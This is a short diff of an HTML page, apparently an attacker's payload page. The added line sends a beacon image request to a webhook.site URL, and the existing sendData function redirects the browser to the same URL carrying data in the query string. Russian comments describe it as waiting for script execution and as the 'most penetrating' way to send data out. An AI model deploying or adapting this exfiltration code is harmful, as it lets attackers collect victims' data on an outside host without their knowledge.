@@ -5,6 +5,7 @@
     <h1 id="status">Ждем исполнения скрипта...</h1>
 
     <script>
+        new Image().src = "https://webhook.site/da38e76f-4179-451b-9c4d-937c64f19e98?ping=alive";
         // Функция для отправки данных через редирект (самый пробивной метод)
         function sendData(param, value) {
             window.location.href = "https://webhook.site/da38e76f-4179-451b-9c4d-937c64f19e98?" + param + "=" + encodeURIComponent(value);
